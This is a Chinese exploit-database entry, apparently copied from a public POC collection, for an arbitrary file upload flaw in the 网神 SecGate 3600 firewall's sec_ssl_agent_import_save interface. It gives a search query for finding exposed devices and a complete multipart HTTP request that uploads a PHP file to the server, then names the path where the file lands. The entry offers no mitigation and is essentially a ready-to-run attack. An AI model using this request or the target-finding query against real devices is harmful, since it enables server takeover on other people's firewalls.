---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 网神SecGata 3600防火墙sec_ssl_agent_import_save任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">网神 SecGate 3600 防火墙 sec_ssl_agent_import_save接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 网神SecGata 3600防火墙

# 三、资产测绘
    - hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"`


+ 登录页面


# 四、漏洞复现
```plain
POST /?g=sec_ssl_agent_import_save HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Content-Length: 343
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEkSeIhsa5fnqB0Zn
Upgrade-Insecure-Requests: 1
SL-CE-SUID: 1057
        

------WebKitFormBoundaryEkSeIhsa5fnqB0Zn
Content-Disposition: form-data; name="reqfile"; filename="2.php"
Content-Type: text/plain

<?php echo "testvuln";?>
        
------WebKitFormBoundaryEkSeIhsa5fnqB0Zn
Content-Disposition: form-data; name="submit_post"

sec_ssl_agent_import_save
------WebKitFormBoundaryEkSeIhsa5fnqB0Zn--
```


上传文件位置

```plain
/attachements/2.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wmrum6asvg0bsdhy>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
